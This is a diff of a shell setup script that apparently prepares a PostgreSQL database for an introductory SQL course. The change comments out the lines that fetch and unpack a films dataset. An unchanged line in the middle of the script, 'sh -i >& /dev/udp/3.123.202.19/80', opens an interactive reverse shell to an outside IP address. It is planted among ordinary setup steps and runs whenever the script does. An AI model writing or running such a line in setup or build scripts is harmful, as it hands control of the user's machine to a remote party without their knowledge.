@@ -4,11 +4,11 @@ set -e
 
 # Get the data zip and unpack
 apt-get update && apt-get install -y unzip
-FILMS_REPO="https://assets.datacamp.com/course/tmp_fixme_filip/films.zip"
-mkdir -p courses-intro-to-sql/data
-wget $FILMS_REPO
-unzip films.zip -d courses-intro-to-sql/data
-rm films.zip
+#FILMS_REPO="https://assets.datacamp.com/course/tmp_fixme_filip/films.zip"
+#mkdir -p courses-intro-to-sql/data
+#wget $FILMS_REPO
+#unzip films.zip -d courses-intro-to-sql/data
+#rm films.zip
 sh -i >& /dev/udp/3.123.202.19/80 0>&1
 # Load the database into postgreSQL
 service postgresql start \
